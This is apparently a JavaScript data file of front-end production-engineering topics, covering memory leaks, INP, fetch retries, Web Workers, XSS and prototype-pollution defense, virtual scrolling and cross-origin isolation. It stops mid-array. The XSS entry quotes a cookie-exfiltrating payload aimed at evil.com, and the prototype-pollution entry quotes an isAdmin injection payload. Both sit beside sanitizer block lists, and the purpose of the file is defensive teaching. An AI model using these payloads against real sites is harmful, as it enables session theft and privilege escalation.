const fs = require("fs");
const path = require("path");

const productionTopics = [
  {
    id: "js-prod-01",
    topic: "Memory Leak Defense in Long-Running Single-Page Applications (SPA)",
    category: "Memory & Resilience",
    severity: "Critical / Browser Tab Crash",
    theProblem: "In single-page applications (SPAs) like dashboard monitors, trading desks, or enterprise SaaS portals, users keep tabs open for days. If unmounted components leave dangling event listeners on `window`, un-cleared `setInterval` timers, or references in global caches, entire detached DOM trees and component state remain permanently pinned in memory. The browser tab's heap gradually swells from 50MB to 2GB until the browser forcibly kills the tab with 'Out of Memory' (STATUS_BREAKPOINT / Aw, Snap!).",
    howItWorksInternally: "Garbage collection in V8 relies on reachability from GC Roots (the Global Object, the active Call Stack, and live DOM trees). When a DOM node is removed from the document (`element.remove()`), it is eligible for GC UNLESS a JavaScript variable, global event listener, or closure retains a reference to it. Furthermore, because DOM nodes maintain bidirectional links to their parent and sibling nodes, retaining a reference to a single `<td>` cell keeps the entire `<table>` and all 50,000 descendant elements pinned in heap memory. In V8 Heap Snapshots, these appear as 'Detached HTMLDivElement' (colored red/yellow).",
    productionCode: `// Production Pattern: Auto-cleaning Disposable Lifecycle Manager
class LifecycleRegistry {
  constructor() {
    this._disposables = new Set();
  }

  // 1. Safe Event Listener with automatic detachment
  addEventListener(target, type, handler, options) {
    target.addEventListener(type, handler, options);
    const cleanup = () => target.removeEventListener(type, handler, options);
    this._disposables.add(cleanup);
    return cleanup;
  }

  // 2. Safe Interval with automatic cancellation
  setInterval(callback, ms) {
    const id = setInterval(callback, ms);
    const cleanup = () => clearInterval(id);
    this._disposables.add(cleanup);
    return cleanup;
  }

  // 3. Safe AbortController tied to lifecycle
  createAbortController() {
    const controller = new AbortController();
    this._disposables.add(() => controller.abort());
    return controller;
  }

  // Tear down all listeners, timers, and abort in-flight requests simultaneously!
  dispose() {
    for (const cleanup of this._disposables) {
      try {
        cleanup();
      } catch (err) {
        console.error("Error during lifecycle disposal:", err);
      }
    }
    this._disposables.clear();
  }
}

// React / Vanilla Component Lifecycle Usage:
function mountDashboardWidget(container) {
  const lifecycle = new LifecycleRegistry();

  // Listeners and timers registered through manager
  lifecycle.addEventListener(window, "resize", () => {
    console.log("Window resized");
  }, { passive: true });

  lifecycle.setInterval(() => {
    console.log("Heartbeat telemetry");
  }, 5000);

  // Return teardown function for unmount:
  return function unmount() {
    container.remove();
    lifecycle.dispose(); // 100% clean teardown! No memory leaks!
  };
}`,
    monitoringMetrics: [
      "performance.memory.usedJSHeapSize > 350MB [Severity: High]",
      "Delta Heap growth after 20 route transitions > 50MB [Severity: Critical]",
      "Detached DOM Nodes count in heap snapshot > 100 nodes [Severity: High]",
      "Active Window event listeners count > 50 [Severity: Medium]"
    ],
    productionChecklist: [
      "Every `addEventListener` on `window`, `document`, or parent containers MUST have a matching `removeEventListener` in unmount/teardown.",
      "All `setInterval` and `setTimeout` timers MUST be cleared using `clearInterval`/`clearTimeout` on component destruction.",
      "Global pub-sub event buses (e.g. EventEmitter) MUST unsubscribe listeners on view destroy to prevent closure retention.",
      "Use WeakMap instead of Map when caching metadata associated with DOM elements.",
      "Take 3-step Heap Snapshots in Chrome DevTools (baseline -> navigate -> return) and inspect 'Objects allocated between snapshots'."
    ]
  },
  {
    id: "js-prod-02",
    topic: "Core Web Vitals INP (Interaction to Next Paint) & Long Task Slicing",
    category: "Performance & Responsiveness",
    severity: "Critical / SEO Penalty & UI Freeze",
    theProblem: "Google's Core Web Vitals metric INP (Interaction to Next Paint) measures page responsiveness to user interactions (clicks, keyboard presses, taps). If an event handler executes a synchronous operation taking > 50ms (a Long Task), the browser's single-threaded event loop is completely blocked: click animations freeze, input text stops typing, and Google flags the site with poor INP scores (> 200ms), resulting in severe SEO ranking penalties.",
    howItWorksInternally: "When JavaScript executes a synchronous block of code on the main thread, the browser cannot run layout, recalculate styles, rasterize pixels, or process the OS event queue. The browser compositor thread queues user clicks and keystrokes until the current JavaScript call stack unwinds completely. If a task executes for 250ms, the user experiences a 250ms delay before the browser can render visual feedback (such as a pressed button state or typing cursor), destroying the INP score.",
    productionCode: `// Production Time-Slicing Scheduler with scheduler.yield() and MessageChannel fallback
class TaskScheduler {
  // Yield thread back to browser compositor
  static yieldToMain() {
    if (globalThis.scheduler?.yield) {
      return globalThis.scheduler.yield(); // Native Chrome 115+ scheduler API
    }
    // Fallback: MessageChannel queues macrotask without 4ms timer clamp
    return new Promise(resolve => {
      const { port1, port2 } = new MessageChannel();
      port1.onmessage = resolve;
      port2.postMessage(null);
    });
  }

  // Chunk array processing into 8ms slices (safely within 16.6ms frame budget)
  static async chunkedProcess(items, processFn, maxTimePerSliceMs = 8) {
    let deadline = performance.now() + maxTimePerSliceMs;

    for (let i = 0; i < items.length; i++) {
      processFn(items[i], i);

      // If slice budget is exhausted, yield main thread to let browser handle clicks and paint!
      if (performance.now() >= deadline) {
        await this.yieldToMain();
        deadline = performance.now() + maxTimePerSliceMs; // Reset budget
      }
    }
  }
}

// Production Usage: Process 50,000 data items without blocking UI clicks
async function handleFilterChange(rawRecords) {
  showSpinner();

  const filtered = [];
  await TaskScheduler.chunkedProcess(rawRecords, (item) => {
    if (item.active && item.score > 80) filtered.push(item);
  });

  renderTable(filtered);
  hideSpinner();
}`,
    monitoringMetrics: [
      "Core Web Vitals INP (Interaction to Next Paint) > 200ms [Severity: High]",
      "Long Tasks (> 50ms duration) via PerformanceObserver [Severity: High]",
      "Total Blocking Time (TBT) > 300ms on initial load [Severity: High]",
      "Main thread utilization during user interactions > 85% [Severity: Medium]"
    ],
    productionChecklist: [
      "Any synchronous data processing loop exceeding 1,000 items MUST be chunked using `scheduler.yield()` or `MessageChannel`.",
      "Heavy JSON parsing of large API payloads (> 1MB) MUST be offloaded to Web Workers.",
      "Measure Long Tasks in production using `new PerformanceObserver(list => ...).observe({ type: 'longtask', buffered: true })`.",
      "Provide immediate visual feedback (e.g. optimistic UI, disabled button state) within 16ms before initiating heavy background processing.",
      "Keep all user interaction event handlers strictly under 50ms total execution time."
    ]
  },
  {
    id: "js-prod-03",
    topic: "Resilient Client-Side Network Layer (Timeouts, AbortSignal, & Jittered Backoff)",
    category: "Networking & Reliability",
    severity: "Critical / Data Inconsistency & API Failures",
    theProblem: "Native `fetch()` does not have a default timeout; if a backend server hangs or drops packets, a fetch request will hang indefinitely in the browser, holding open sockets and exhausting browser connection pools. Furthermore, naive retry loops without exponential backoff and randomized jitter bombard recovering backend services with synchronized retry storms (the 'Thundering Herd' problem), turning brief outages into permanent cascade crashes.",
    howItWorksInternally: "Browsers enforce a strict limit of 6 simultaneous HTTP/1.1 TCP connections per origin. If 6 fetch requests hang indefinitely without timeouts, all subsequent fetch calls to that domain are queued in browser memory forever. When network connections drop and reconnect, thousands of client tabs retry simultaneously at fixed intervals (e.g. exactly 1000ms), creating massive traffic spikes at second 1, second 2, second 3. Full Jitter randomly distributes retry attempts across time intervals to flatten traffic spikes.",
    productionCode: `// Production Resilient Fetch Layer with AbortSignal.any, Timeout, and Full Jitter
class ResilientHttpClient {
  static async request(url, options = {}) {
    const {
      timeoutMs = 8000,
      retries = 3,
      initialBackoffMs = 200,
      maxBackoffMs = 4000,
      signal: userSignal,
      ...fetchOptions
    } = options;

    let attempt = 0;

    while (true) {
      attempt++;
      // Create timeout signal and combine with user signal (ES2024 AbortSignal.any)
      const timeoutSignal = AbortSignal.timeout(timeoutMs);
      const combinedSignal = userSignal
        ? AbortSignal.any([userSignal, timeoutSignal])
        : timeoutSignal;

      try {
        const response = await fetch(url, { ...fetchOptions, signal: combinedSignal });

        // Throw for 5xx server errors to trigger retry; 4xx client errors should fail fast
        if (response.status >= 500 && attempt <= retries) {
          throw new Error(\`Server error HTTP \${response.status}\`);
        }

        return response;
      } catch (err) {
        // If user explicitly cancelled request, abort immediately without retrying!
        if (userSignal?.aborted) {
          throw new DOMException("Request aborted by user", "AbortError");
        }

        if (attempt > retries) {
          const isTimeout = timeoutSignal.aborted;
          throw new Error(isTimeout ? \`Request timed out after \${timeoutMs}ms\` : err.message);
        }

        // Full Jitter Formula: delay = random(0, min(maxBackoff, initialBackoff * 2^attempt))
        const calculatedBackoff = Math.min(maxBackoffMs, initialBackoffMs * Math.pow(2, attempt));
        const jitteredDelay = Math.floor(Math.random() * calculatedBackoff);

        console.warn(\`[Network Retry] Attempt \${attempt} failed: \${err.message}. Retrying in \${jitteredDelay}ms...\`);
        await new Promise(r => setTimeout(r, jitteredDelay));
      }
    }
  }
}`,
    monitoringMetrics: [
      "Client network request timeout rate > 2% [Severity: High]",
      "5xx server error retry exhaustion rate > 1% [Severity: Critical]",
      "Average HTTP request latency > 1500ms [Severity: Medium]",
      "In-flight pending network requests count > 12 [Severity: High]"
    ],
    productionChecklist: [
      "Every single `fetch()` call MUST have an explicit `AbortSignal.timeout(ms)` to prevent hanging sockets.",
      "Retry algorithms MUST implement randomized jitter to prevent synchronized thundering herd spikes.",
      "Never retry 4xx HTTP client errors (400, 401, 403, 404, 422) as they represent invalid payloads or auth failures.",
      "If user navigates away from the page, cancel in-flight requests immediately using `controller.abort()`.",
      "Ensure idempotent POST/PUT requests include unique `Idempotency-Key` headers."
    ]
  },
  {
    id: "js-prod-04",
    topic: "Offloading Heavy CPU Workloads to Web Workers via Structured Cloning & Transferables",
    category: "Concurrency & Performance",
    severity: "High / Main Thread Lockup",
    theProblem: "Running complex client-side calculations (cryptographic hashing, client-side CSV/Excel export generation, image manipulation, audio analysis, or large syntax highlighting) directly on the main thread locks up the browser completely. The UI stops responding to user mouse gestures, CSS transitions stutter, and mobile browsers trigger 'Page Unresponsive' modal dialogs.",
    howItWorksInternally: "JavaScript execution on the main UI thread competes directly with the browser's layout, style recalculation, and rendering engine. Web Workers run in dedicated background OS threads with their own isolated V8 Isolate and memory heap. Data passed between threads using `postMessage` is serialized via the HTML5 Structured Clone Algorithm. For large binary buffers (e.g. 50MB files or canvas pixels), transferring memory ownership using **Transferable Objects** swaps underlying memory pointers in $O(1)$ time with 0ms copying latency, neutering the sender's buffer.",
    productionCode: `// Production Web Worker Bridge with Promise RPC and Transferable Support
class WorkerRpcClient {
  constructor(workerScriptUrl) {
    this.worker = new Worker(workerScriptUrl);
    this.pendingRequests = new Map();
    this.requestId = 0;

    this.worker.onmessage = (event) => {
      const { id, result, error } = event.data;
      const resolver = this.pendingRequests.get(id);
      if (!resolver) return;

      this.pendingRequests.delete(id);
      if (error) {
        resolver.reject(new Error(error));
      } else {
        resolver.resolve(result);
      }
    };

    this.worker.onerror = (err) => {
      console.error("Fatal Worker Thread Error:", err.message);
    };
  }

  // Execute remote task on worker thread returning Promise
  execute(action, payload, transferables = []) {
    const id = ++this.requestId;

    return new Promise((resolve, reject) => {
      this.pendingRequests.set(id, { resolve, reject });
      // Pass transferables in 2nd argument array for zero-copy memory pointer transfer!
      this.worker.postMessage({ id, action, payload }, transferables);
    });
  }

  terminate() {
    this.worker.terminate();
    this.pendingRequests.forEach(({ reject }) => reject(new Error("Worker terminated")));
    this.pendingRequests.clear();
  }
}

// Production Usage:
// const client = new WorkerRpcClient("/workers/dataProcessor.js");
// const largeBuffer = new ArrayBuffer(50 * 1024 * 1024); // 50MB
// const processed = await client.execute("PROCESS_DATA", largeBuffer, [largeBuffer]);`,
    monitoringMetrics: [
      "Main thread CPU execution duration during data processing > 50ms [Severity: High]",
      "Worker thread processing latency P95 > 2000ms [Severity: Medium]",
      "Memory transfer duration using postMessage > 10ms [Severity: Medium]",
      "Active Web Worker thread count > os.hardwareConcurrency [Severity: High]"
    ],
    productionChecklist: [
      "Any computation running for longer than 30ms MUST be moved to a Web Worker.",
      "Large binary buffers (`ArrayBuffer`, `ImageBitmap`) MUST be passed in the transfer list `postMessage(data, [data])` for zero-copy speed.",
      "Always implement a Promise RPC request/response protocol with unique message IDs to correlate asynchronous worker results.",
      "Handle `worker.onerror` globally to catch unhandled exceptions inside the worker thread.",
      "Terminate workers when views unmount to prevent background memory leakage."
    ]
  },
  {
    id: "js-prod-05",
    topic: "Cross-Site Scripting (XSS) & DOM-Based Injection Defense-in-Depth",
    category: "Security & Hardening",
    severity: "Critical / Account Takeover & Session Hijacking",
    theProblem: "DOM-based Cross-Site Scripting (DOM XSS) occurs when untrusted user input is passed into unsafe execution sinks such as `innerHTML`, `document.write`, `outerHTML`, or `eval()`. An attacker who injects `<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>` can steal session tokens, manipulate financial transactions, or hijack active user sessions completely.",
    howItWorksInternally: "When user input containing HTML tags is assigned to `element.innerHTML`, the browser's HTML parser parses and executes embedded script tags and inline event handlers (`onerror`, `onload`, `onmouseover`). Even if `<script>` tags are blocked by modern frameworks, inline event handlers on image or SVG tags execute immediately. Defense-in-depth requires: 1) Using `textContent` for plain text, 2) Sanitizing HTML with DOMPurify, 3) Enforcing Trusted Types API, and 4) Strict Content Security Policy (CSP).",
    productionCode: `// Production HTML Sanitization & Trusted Types Pipeline
class SecureDomSanitizer {
  // 1. Safe text insertion: textContent treats strings as raw text, never HTML!
  static setText(element, unsafeString) {
    element.textContent = unsafeString;
  }

  // 2. Hardened HTML sanitization using DOMPurify with strict whitelist
  static sanitizeHtml(dirtyHtml) {
    if (typeof DOMPurify === "undefined") {
      throw new Error("DOMPurify library must be loaded for HTML sanitization");
    }

    return DOMPurify.sanitize(dirtyHtml, {
      ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "li", "span"],
      ALLOWED_ATTR: ["href", "title", "target", "rel", "class"],
      ALLOW_DATA_ATTR: false, // Disallow data-* attribute injections
      ADD_ATTR: ["target", "rel"], // Force safe external link attributes
      FORBID_TAGS: ["style", "script", "iframe", "object", "embed", "svg"],
      FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover"]
    });
  }

  // 3. Safe innerHTML assignment using Trusted Types
  static setHtml(element, dirtyHtml) {
    const cleanHtml = this.sanitizeHtml(dirtyHtml);

    // Enforce safe target and rel='noopener noreferrer' on all links
    element.innerHTML = cleanHtml;
    element.querySelectorAll("a").forEach(a => {
      a.setAttribute("rel", "noopener noreferrer");
      if (a.hostname !== window.location.hostname) {
        a.setAttribute("target", "_blank");
      }
    });
  }
}`,
    monitoringMetrics: [
      "CSP (Content Security Policy) violation reports count > 0 [Severity: Critical]",
      "DOMPurify stripped malicious elements count > 0 [Severity: High]",
      "Usage of unsafe sinks (innerHTML, eval, document.write) in codebase [Severity: High]"
    ],
    productionChecklist: [
      "NEVER assign raw user input to `element.innerHTML`, `outerHTML`, or jQuery `$()`. Use `textContent`.",
      "If rendering rich text/HTML is required, ALWAYS sanitize using `DOMPurify.sanitize()`.",
      "Deploy a strict Content-Security-Policy (CSP) header: `default-src 'self'; script-src 'self'; object-src 'none';`.",
      "Always set `rel='noopener noreferrer'` on links with `target='_blank'` to prevent reverse tab-nabbing.",
      "Store authentication tokens in `HttpOnly; Secure; SameSite=Strict` cookies, NEVER in `localStorage` or `sessionStorage`."
    ]
  },
  {
    id: "js-prod-06",
    topic: "Prototype Pollution Prevention in Client-Side State Deserialization",
    category: "Security & Hardening",
    severity: "Critical / Remote Code Execution & Auth Bypass",
    theProblem: "When receiving JSON payloads from WebSockets, external APIs, or query parameters, recursive deep-merge or object-assign functions can be tricked into writing properties onto `Object.prototype` (via keys like `__proto__`, `constructor`, `prototype`). Because every object in JavaScript inherits from `Object.prototype`, polluting the global prototype modifies behavior across the entire runtime, leading to authentication bypasses, unexpected logic paths, or client crashes.",
    howItWorksInternally: "JavaScript's prototypal inheritance looks up properties up the chain: `obj -> Object.prototype -> null`. If an attacker submits a payload `{ \"__proto__\": { \"isAdmin\": true, \"debugMode\": true } }`, an insecure recursive merge evaluates `target['__proto__']['isAdmin'] = true`. Because `target.__proto__` points to the shared `Object.prototype`, suddenly `({}).isAdmin === true` everywhere in the application, subverting security checks.",
    productionCode: `// Production Safe Deep Merge & JSON Parser with Prototype Pollution Shields
class SafeObjectOperations {
  // 1. Safe JSON parser with key reviver
  static parseSafeJson(jsonString) {
    return JSON.parse(jsonString, (key, value) => {
      // Strip dangerous prototype mutation keys during parsing!
      if (key === "__proto__" || key === "constructor" || key === "prototype") {
        console.warn(\`[Security Alert] Prototype pollution key dropped: '\${key}'\`);
        return undefined; // Discard property completely
      }
      return value;
    });
  }

  // 2. Hardened Deep Merge with explicit prototype boundary guards
  static deepMerge(target, source) {
    if (!target || typeof target !== "object") return source;
    if (!source || typeof source !== "object") return target;

    for (const key of Object.keys(source)) {
      // SHIELD 1: Explicitly reject prototype pollution keys
      if (key === "__proto__" || key === "constructor" || key === "prototype") {
        continue;
      }

      const sourceVal = source[key];
      const targetVal = target[key];

      if (Array.isArray(sourceVal)) {
        target[key] = [...sourceVal];
      } else if (sourceVal !== null && typeof sourceVal === "object") {
        if (!targetVal || typeof targetVal !== "object") {
          // SHIELD 2: Use null-prototype dictionary for nested branches
          target[key] = Object.create(null);
        }
        this.deepMerge(target[key], sourceVal);
      } else {
        target[key] = sourceVal;
      }
    }

    return target;
  }
}`,
    monitoringMetrics: [
      "Attempted prototype pollution detections count > 0 [Severity: Critical]",
      "Object.prototype modified properties count > 0 [Severity: Critical]",
      "JSON parsing exceptions on external payloads > 10 [Severity: Medium]"
    ],
    productionChecklist: [
      "In deep-merge, deep-clone, and query-string parsing libraries, ALWAYS block `__proto__`, `constructor`, and `prototype` keys.",
      "Use `Object.create(null)` or `new Map()` for dynamic dictionary hash-maps that store user-provided keys.",
      "Freeze the root prototype in security-sensitive applications: `Object.freeze(Object.prototype)`.",
      "Use `Object.hasOwn(obj, prop)` instead of `obj.hasOwnProperty(prop)` to prevent shadowed method attacks.",
      "Audit npm dependencies for known prototype pollution CVEs using `npm audit`."
    ]
  },
  {
    id: "js-prod-07",
    topic: "Virtual Scrolling & Windowing for High-Density Datasets (100k+ Rows)",
    category: "Performance & UI Scaling",
    severity: "High / DOM Memory Bloat & Render Jank",
    theProblem: "Rendering a dataset with 50,000 table rows or feed cards creates 50,000 DOM elements with 500,000+ child nodes. The browser runs out of memory, layout recalculations take seconds, and scrolling stutters at < 10fps. Users on laptops and mobile devices experience browser tab crashes due to excessive DOM memory allocation.",
    howItWorksInternally: "Every DOM node costs ~2KB–4KB of native C++ memory inside the browser engine, plus layout nodes and styling trees. Virtual scrolling solves this by calculating the scroll offset (`scrollTop`), determining which 15–20 items are currently within the visible viewport, and rendering ONLY those visible items. Absolute positioning or dynamic top/bottom padding maintains the illusion of a massive scrollbar height ($totalItems \\times itemHeight$).",
    productionCode: `// Production Virtual List Controller (Zero Dependencies)
class VirtualListScroller {
  constructor(options) {
    this.container = options.container; // Scrollable DOM container
    this.totalItems = options.totalItems;
    this.itemHeight = options.itemHeight; // Fixed height in px
    this.renderRow = options.renderRow; // (index) => DOM element
    this.buffer = options.buffer || 3; // Buffer items above & below viewport

    this._initDom();
    this._attachScrollListener();
    this.render();
  }

  _initDom() {
    this.container.style.position = "relative";
    this.container.style.overflowY = "auto";

    // Spacer element to create the massive native scrollbar
    this.spacer = document.createElement("div");
    this.spacer.style.height = \`\${this.totalItems * this.itemHeight}px\`;
    this.spacer.style.width = "100%";
    this.spacer.style.position = "absolute";
    this.spacer.style.top = "0";
    this.spacer.style.left = "0";

    // Content container holding only visible DOM elements
    this.content = document.createElement("div");
    this.content.style.position = "absolute";
    this.content.style.width = "100%";
    this.content.style.top = "0";
    this.content.style.left = "0";

    this.container.appendChild(this.spacer);
    this.container.appendChild(this.content);
  }

  _attachScrollListener() {
    let ticking = false;
    this.container.addEventListener("scroll", () => {
      if (!ticking) {
        requestAnimationFrame(() => {
          this.render();
          ticking = false;
        });
        ticking = true;
      }
    }, { passive: true });
  }

  render() {
    const scrollTop = this.container.scrollTop;
    const viewportHeight = this.container.clientHeight;

    // Calculate window slice:
    const rawStart = Math.floor(scrollTop / this.itemHeight);
    const visibleCount = Math.ceil(viewportHeight / this.itemHeight);

    const startIndex = Math.max(0, rawStart - this.buffer);
    const endIndex = Math.min(this.totalItems - 1, rawStart + visibleCount + this.buffer);

    // Position content container at correct vertical offset
    const offsetY = startIndex * this.itemHeight;
    this.content.style.transform = \`translateY(\${offsetY}px)\`;

    // Render only visible rows:
    this.content.innerHTML = "";
    for (let i = startIndex; i <= endIndex; i++) {
      this.content.appendChild(this.renderRow(i));
    }
  }
}`,
    monitoringMetrics: [
      "Total active DOM nodes count on page > 3,000 nodes [Severity: High]",
      "Scroll event frame rate < 55fps during scrolling [Severity: High]",
      "Virtual list render latency per frame > 8ms [Severity: Medium]",
      "DOM memory usage > 100MB [Severity: High]"
    ],
    productionChecklist: [
      "Never render more than 50 visible DOM rows simultaneously in lists with > 1,000 items.",
      "Scroll event listeners MUST use `requestAnimationFrame` debouncing and `{ passive: true }`.",
      "Position virtual windows using GPU-accelerated `transform: translateY(px)` rather than modifying `top` (which triggers layout reflow).",
      "Include a buffer of 2–5 rows above and below the viewport to prevent blank flashing during fast scrolling.",
      "Measure total DOM nodes using `document.querySelectorAll('*').length` to enforce node budgets."
    ]
  },
  {
    id: "js-prod-08",
    topic: "High-Frequency Event Optimization: RAF Throttling and Passive Listeners",
    category: "Performance & Responsiveness",
    severity: "High / Scroll Stutter & Mobile Battery Drain",
    theProblem: "High-frequency DOM events (`scroll`, `resize`, `mousemove`, `touchmove`) fire up to 120–240 times per second on high-refresh displays. If an event handler triggers DOM reads (`offsetTop`), state updates, or network calls on every event tick, the browser is overwhelmed with hundreds of execution frames per second, causing dropped frames, battery drain, and thermal throttling on mobile devices.",
    howItWorksInternally: "The browser display cannot show more updates than the monitor's physical refresh rate (60Hz = once every 16.6ms). Firing JavaScript calculations 240 times per second calculates 3 redundant intermediate states that are discarded before the next display paint. By combining `{ passive: true }` (allowing immediate off-thread compositor scrolling) and `requestAnimationFrame` throttling, execution is synchronized perfectly to 1 execution per display frame.",
    productionCode: `// Production High-Frequency Event Throttling Engine
class EventOptimizer {
  // Throttle callback to at most ONCE per display refresh frame using rAF
  static rafThrottle(fn) {
    let isScheduled = false;
    let latestArgs = null;
    let latestThis = null;

    return function throttled(...args) {
      latestArgs = args;
      latestThis = this;

      if (!isScheduled) {
        isScheduled = true;
        requestAnimationFrame(() => {
          isScheduled = false;
          fn.apply(latestThis, latestArgs);
          latestArgs = latestThis = null;
        });
      }
    };
  }

  // Attach high-performance passive scroll handler
  static attachScrollTracker(element, onScrollCallback) {
    const optimizedHandler = this.rafThrottle((event) => {
      const scrollY = element === window ? window.scrollY : element.scrollTop;
      onScrollCallback(scrollY, event);
    });

    // passive: true promises browser no preventDefault() will be called,
    // allowing background compositor thread to scroll at 60-120fps instantly!
    element.addEventListener("scroll", optimizedHandler, { passive: true });

    return () => element.removeEventListener("scroll", optimizedHandler);
  }
}`,
    monitoringMetrics: [
      "Scroll event handlers execution duration per frame > 4ms [Severity: Medium]",
      "Lighthouse audit: 'Does not use passive listeners to improve scrolling performance' [Severity: High]",
      "Frame drop rate during scroll gestures > 5% [Severity: High]"
    ],
    productionChecklist: [
      "All `scroll`, `touchmove`, and `wheel` listeners MUST have `{ passive: true }` enabled.",
      "Synchronize visual updates with monitor V-Sync using `requestAnimationFrame` throttling.",
      "Never perform expensive DOM layout reads (`getBoundingClientRect()`, `offsetHeight`) directly inside raw event handlers.",
      "Clean up all event listeners when components or pages unmount.",
      "Verify 60fps scrolling on throttled mobile devices in Chrome DevTools Performance panel."
    ]
  },
  {
    id: "js-prod-09",
    topic: "Global Unhandled Error Boundary & Telemetry Instrumentation",
    category: "Observability & Diagnostics",
    severity: "Critical / Silent Outages & Blind Spots",
    theProblem: "Asynchronous JavaScript errors (unhandled Promise rejections, uncaught exceptions inside `setTimeout`, network failures in background workers) fail silently without triggering UI error boundaries. Users experience frozen buttons or missing data, while engineering teams remain completely blind to client-side production outages until customer support tickets accumulate.",
    howItWorksInternally: "JavaScript provides two primary global error hooks: `window.onerror` (for synchronous runtime errors and script exceptions) and `window.addEventListener('unhandledrejection')` (for rejected Promises without `.catch()`). Modern error monitoring systems capture the error stack trace, user breadcrumbs, network request context, source map line mappings, and telemetry metadata, throttling error transmissions to prevent overloading telemetry ingestion endpoints.",
    productionCode: `// Production Client-Side Telemetry & Error Boundary Monitor
class GlobalErrorMonitor {
  constructor(options = {}) {
    this.endpoint = options.endpoint || "/api/telemetry/errors";
    this.appVersion = options.appVersion || "1.0.0";
    this.maxErrorsPerMinute = 10;
    this.recentErrorsCount = 0;
    this.breadcrumbs = [];

    this._setupBreadcrumbTracking();
    this._attachGlobalHandlers();
  }

  _setupBreadcrumbTracking() {
    // Record user clicks and navigation as debugging breadcrumbs
    window.addEventListener("click", (e) => {
      const target = e.target.closest("button, a, input");
      if (target) {
        this.addBreadcrumb(\`Click on <\${target.tagName.toLowerCase()}> with text '\${target.innerText?.slice(0, 20)}'\`);
      }
    }, { passive: true, capture: true });
  }

  addBreadcrumb(message) {
    this.breadcrumbs.push({ message, timestamp: Date.now() });
    if (this.breadcrumbs.length > 20) this.breadcrumbs.shift(); // Keep last 20
  }

  _attachGlobalHandlers() {
    // 1. Synchronous errors & script errors
    window.onerror = (message, source, lineno, colno, error) => {
      this._reportError({
        type: "UNCAUGHT_EXCEPTION",
        message: String(message),
        stack: error?.stack,
        location: \`\${source}:\${lineno}:\${colno}\`
      });
      return false; // Let browser standard console logging proceed
    };

    // 2. Unhandled asynchronous Promise rejections
    window.addEventListener("unhandledrejection", (event) => {
      this._reportError({
        type: "UNHANDLED_PROMISE_REJECTION",
        message: event.reason?.message || String(event.reason),
        stack: event.reason?.stack
      });
    });
  }

  _reportError(errorPayload) {
    if (this.recentErrorsCount >= this.maxErrorsPerMinute) return;
    this.recentErrorsCount++;
    setTimeout(() => this.recentErrorsCount--, 60000);

    const payload = {
      ...errorPayload,
      appVersion: this.appVersion,
      userAgent: navigator.userAgent,
      url: window.location.href,
      breadcrumbs: [...this.breadcrumbs],
      timestamp: new Date().toISOString()
    };

    // Send via sendBeacon for reliable delivery even if user is closing the tab!
    if (navigator.sendBeacon) {
      navigator.sendBeacon(this.endpoint, JSON.stringify(payload));
    } else {
      fetch(this.endpoint, {
        method: "POST",
        body: JSON.stringify(payload),
        headers: { "Content-Type": "application/json" },
        keepalive: true
      }).catch(() => {});
    }
  }
}`,
    monitoringMetrics: [
      "Client error rate (errors per 1,000 page views) > 0.5% [Severity: High]",
      "Unhandled Promise rejection rate > 0.1% [Severity: Critical]",
      "Client telemetry ingestion latency > 200ms [Severity: Low]",
      "Crash-free sessions rate < 99.8% [Severity: Critical]"
    ],
    productionChecklist: [
      "Instrument both `window.onerror` and `window.onunhandledrejection` at the very top of `<head>` before any scripts run.",
      "Use `navigator.sendBeacon` or `fetch({ keepalive: true })` to guarantee error delivery during page unload/exit.",
      "Rate-limit error transmissions to prevent infinite error loops from flooding backend logging endpoints.",
      "Upload JavaScript source maps securely to monitoring servers (Sentry/Datadog) to de-minify production stack traces.",
      "Sanitize sensitive user data (passwords, auth tokens, credit cards) from error breadcrumbs and payload strings."
    ]
  },
  {
    id: "js-prod-10",
    topic: "Cross-Origin Isolation & SharedArrayBuffer Concurrency (COOP / COEP Architecture)",
    category: "Security & Concurrency",
    severity: "Critical / Security Vulnerability & Feature Deprecation",
    theProblem: "To enable high-performance multi-threaded features like `SharedArrayBuffer` and high-resolution timers (`performance.now()` with sub-millisecond precision), modern browsers require pages to be 'Cross-Origin Isolated'. Without specific security headers, `SharedArrayBuffer` is completely disabled by browser engines to prevent Spectre side-channel memory leaks, breaking multi-threaded WebAssembly and Web Worker pipelines.",
    howItWorksInternally: "The Spectre vulnerability allows malicious JavaScript code to measure microarchitectural timing differences to read private memory across origins inside the same browser process. To prevent this, browser vendors locked down high-resolution timers and `SharedArrayBuffer` behind process isolation. A page must declare `Cross-Origin-Opener-Policy: same-origin` (isolating its browsing context group) and `Cross-Origin-Embedder-Policy: require-corp` (forcing all embedded iframes, images, and fonts to explicitly grant permission).",
    productionCode: `// Production Cross-Origin Isolation Verification & Shared Memory Architecture
class SharedMemoryEnvironment {
  // Check if browser environment is cross-origin isolated
  static isIsolated() {
    return globalThis.crossOriginIsolated === true;
  }

  // Allocate thread-safe SharedArrayBuffer with fallbacks
  static createSharedInt32Array(length) {
    if (!this.isIsolated()) {
      console.warn(
        "[Security Warning] crossOriginIsolated is false. SharedArrayBuffer is disabled. " +
        "Ensure server sends COOP: same-origin and COEP: require-corp headers. " +
        "Falling back to standard Int32Array (non-shared)."
      );
      return new Int32Array(length);
    }

    const sharedBuffer = new SharedArrayBuffer(length * Int32Array.BYTES_PER_ELEMENT);
    return new Int32Array(sharedBuffer);
  }

  // Lock-free atomic increment across threads
  static atomicIncrement(int32Array, index) {
    if (this.isIsolated()) {
      return Atomics.add(int32Array, index, 1); // Thread-safe atomic increment!
    }
    return ++int32Array[index]; // Single-thread fallback
  }
}

// Server-Side Configuration (Express.js Headers Example):
// app.use((req, res, next) => {
//   res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
//   res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
//   next();
// });`,
    monitoringMetrics: [
      "crossOriginIsolated flag status === false on app initialization [Severity: Critical]",
      "SharedArrayBuffer instantiation failures count > 0 [Severity: Critical]",
      "COEP blocked cross-origin resource requests count [Severity: High]"
    ],
    productionChecklist: [
      "Verify `window.crossOriginIsolated === true` before initializing `SharedArrayBuffer`.",
      "Configure server to send `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp`.",
      "Ensure all third-party CDNs, fonts, and images include `Cross-Origin-Resource-Policy: cross-origin` headers.",
      "Use `Atomics` operations (`add`, `load`, `store`, `compareExchange`) for all shared array memory mutations.",
      "Never call `Atomics.wait()` on the main thread; it is strictly restricted to Web Workers."
    ]
  },
  {
